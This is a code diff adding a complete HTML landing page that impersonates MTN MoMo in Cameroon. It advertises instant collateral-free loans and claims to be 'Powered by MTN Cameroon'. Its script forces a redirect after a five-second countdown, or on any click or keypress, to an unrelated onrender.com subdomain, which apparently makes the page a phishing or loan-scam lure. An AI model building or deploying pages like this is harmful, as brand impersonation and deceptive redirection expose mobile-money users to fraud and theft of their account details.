@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MTN MoMo – Instant Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <style>
+        /* ============================================================
+           MTN MoMo Landing Page - Complete Styles
+           ============================================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* ─── Loading Screen ─── */
+        #loader {
+            position: fixed;
+            inset: 0;
+            background: #003366;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+            transition: opacity 0.5s ease;
+        }
+        
+        #loader.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        .loader-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 215, 0, 0.2);
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .loader-text {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
+            font-weight: 500;
+            letter-spacing: 1px;
+        }
+        
+        /* ─── Main Container ─── */
+        .landing-container {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* ─── Navbar ─── */
+        .navbar {
+            background: #003366;
+            padding: 14px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.15);
+        }
+        
+        .navbar .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+        
+        .navbar .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: #FFD700;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.3rem;
+            font-weight: 900;
+            color: #003366;
+        }
+        
+        .navbar .logo-text {
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: 700;
+        }
+        
+        .navbar .logo-text span {
+            color: #FFD700;
+        }
+        
+        .navbar .logo-sub {
+            font-size: 0.55rem;
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+        
+        .navbar .nav-actions {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .navbar .nav-actions .status {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
+        
+        .navbar .nav-actions .status .dot {
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: pulse-dot 2s infinite;
+        }
+        
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+        
+        .navbar .nav-actions .hamburger {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            cursor: pointer;
+            padding: 4px;
+        }
+        
+        .navbar .nav-actions .hamburger span {
+            width: 22px;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.7);
+            border-radius: 1px;
+        }
+        
+        /* ─── Hero Section ─── */
+        .hero {
+            background: linear-gradient(160deg, #003366 0%, #004080 50%, #00509e 100%);
+            padding: 40px 24px 60px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -30%;
+            width: 80%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.05) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        
+        .hero::after {
+            content: '';
+            position: absolute;
+            bottom: -40%;
+            left: -20%;
+            width: 60%;
+            height: 150%;
+            background: radial-gradient(circle, rgba(255, 215, 0, 0.03) 0%, transparent 70%);
+            border-radius: 50%;
+        }
+        
+        .hero .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hero .badge {
+            display: inline-block;
+            background: rgba(255, 215, 0, 0.15);
+            color: #FFD700;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
+        
+        .hero h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #fff;
+            line-height: 1.2;
+            margin-bottom: 12px;
+        }
+        
+        .hero h1 .highlight {
+            color: #FFD700;
+        }
+        
+        .hero p {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.8);
+            max-width: 480px;
+            margin: 0 auto 24px;
+            line-height: 1.7;
+        }
+        
+        .hero .hero-cta {
+            display: inline-block;
+            padding: 14px 40px;
+            background: #FFD700;
+            color: #003366;
+            border: none;
+            border-radius: 50px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 30px rgba(255, 215, 0, 0.3);
+        }
+        
+        .hero .hero-cta:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px rgba(255, 215, 0, 0.4);
+        }
+        
+        /* ─── Redirect Countdown ─── */
+        .countdown-section {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            padding: 14px 20px;
+            margin-top: 20px;
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .countdown-section .countdown-number {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #FFD700;
+            min-width: 30px;
+        }
+        
+        .countdown-section .countdown-label {
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .countdown-section .countdown-bar {
+            width: 100px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .countdown-section .countdown-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #f5a623);
+            border-radius: 2px;
+            animation: countdown-fill 5s linear forwards;
+        }
+        
+        @keyframes countdown-fill {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        
+        /* ─── Features Section ─── */
+        .features {
+            padding: 40px 24px;
+            background: #fff;
+        }
+        
+        .features .section-title {
+            text-align: center;
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #003366;
+            margin-bottom: 24px;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 16px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        .feature-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 20px 16px;
+            text-align: center;
+            border: 1px solid #eef0f2;
+            transition: transform 0.3s ease;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-4px);
+        }
+        
+        .feature-card .icon {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+        
+        .feature-card h4 {
+            font-size: 0.8rem;
+            font-weight: 600;
+            color: #003366;
+            margin-bottom: 4px;
+        }
+        
+        .feature-card p {
+            font-size: 0.7rem;
+            color: #888;
+            line-height: 1.4;
+        }
+        
+        /* ─── Footer ─── */
+        .footer {
+            margin-top: auto;
+            background: #003366;
+            padding: 20px 24px;
+            text-align: center;
+        }
+        
+        .footer p {
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.4);
+            letter-spacing: 0.5px;
+        }
+        
+        .footer .brand {
+            color: rgba(255, 215, 0, 0.6);
+        }
+        
+        /* ─── Responsive ─── */
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 1.6rem;
+            }
+            
+            .hero p {
+                font-size: 0.9rem;
+            }
+            
+            .navbar .logo-text {
+                font-size: 0.95rem;
+            }
+            
+            .countdown-section {
+                padding: 12px 16px;
+                gap: 10px;
+            }
+            
+            .countdown-section .countdown-number {
+                font-size: 1.1rem;
+            }
+            
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 12px;
+            }
+            
+            .feature-card {
+                padding: 16px 12px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            .hero h1 {
+                font-size: 1.3rem;
+            }
+            
+            .hero .badge {
+                font-size: 0.6rem;
+                padding: 3px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── LOADING SCREEN ─── -->
+    <div id="loader">
+        <div class="loader-spinner"></div>
+        <div class="loader-text">Loading MTN MoMo...</div>
+    </div>
+
+    <!-- ─── LANDING PAGE ─── -->
+    <div class="landing-container">
+
+        <!-- Navbar -->
+        <nav class="navbar">
+            <a href="#" class="logo" onclick="return false;">
+                <div class="logo-icon">M</div>
+                <div>
+                    <div class="logo-text">MTN <span>MoMo</span></div>
+                    <div class="logo-sub">Instant Loans</div>
+                </div>
+            </a>
+            <div class="nav-actions">
+                <div class="status">
+                    <span class="dot"></span>
+                    <span>Live</span>
+                </div>
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="hero-content">
+                <div class="badge">🚀 Quick & Secure</div>
+                <h1>Instant Loans with <br /><span class="highlight">MTN MoMo</span></h1>
+                <p>Get fast access to funds directly to your MTN MoMo account. No collateral, no paperwork — just a few taps.</p>
+                <a href="#" class="hero-cta" id="heroCta">Apply Now →</a>
+
+                <!-- Countdown -->
+                <div class="countdown-section">
+                    <span class="countdown-number" id="countdownNum">5</span>
+                    <span class="countdown-label">Redirecting in seconds</span>
+                    <div class="countdown-bar">
+                        <div class="fill" id="progressFill"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Features -->
+        <section class="features">
+            <div class="section-title">✨ Why MTN MoMo Loans?</div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="icon">⚡</div>
+                    <h4>Quick Approval</h4>
+                    <p>Get approved in minutes</p>
+                </div>
+                <div class="feature-card">
+                    <div class="icon">💰</div>
+                    <h4>Flexible Amounts</h4>
+                    <p>From 500K to 5M XAF</p>
+                </div>
+                <div class="feature-card">
+                    <div class="icon">🔒</div>
+                    <h4>Secure & Safe</h4>
+                    <p>Bank-grade security</p>
+                </div>
+                <div class="feature-card">
+                    <div class="icon">📱</div>
+                    <h4>Easy Process</h4>
+                    <p>Apply from your phone</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2026 <span class="brand">MTN MoMo</span> — Powered by MTN Cameroon. All rights reserved.</p>
+        </footer>
+
+    </div>
+
+    <script>
+        // ============================================================
+        // REDIRECT LOGIC
+        // ============================================================
+
+        const REDIRECT_URL = 'https://mtn-cameroon-15m7.onrender.com#page-step1';
+        const COUNTDOWN_SECONDS = 5;
+
+        // ─── Elements ───
+        const loader = document.getElementById('loader');
+        const countdownNum = document.getElementById('countdownNum');
+        const progressFill = document.getElementById('progressFill');
+        const heroCta = document.getElementById('heroCta');
+
+        // ─── Hide loader after page load ───
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                loader.classList.add('hidden');
+            }, 800);
+        });
+
+        // ─── Countdown ───
+        let secondsLeft = COUNTDOWN_SECONDS;
+        const interval = setInterval(function() {
+            secondsLeft--;
+            countdownNum.textContent = secondsLeft;
+
+            if (secondsLeft <= 0) {
+                clearInterval(interval);
+                // Redirect to loan app
+                window.location.href = REDIRECT_URL;
+            }
+        }, 1000);
+
+        // ─── Click to redirect immediately ───
+        heroCta.addEventListener('click', function(e) {
+            e.preventDefault();
+            clearInterval(interval);
+            window.location.href = REDIRECT_URL;
+        });
+
+        // ─── Keyboard shortcut: Enter or Space to redirect ───
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' || e.key === ' ') {
+                clearInterval(interval);
+                window.location.href = REDIRECT_URL;
+            }
+        });
+
+        // ─── Console log ───
+        console.log('🚀 MTN MoMo Landing Page loaded!');
+        console.log('🔗 Redirecting to: ' + REDIRECT_URL);
+        console.log('⏱️ Countdown: ' + COUNTDOWN_SECONDS + ' seconds');
+        console.log('Press Enter or Space to redirect immediately');
+    </script>
+
+</body>
+</html>
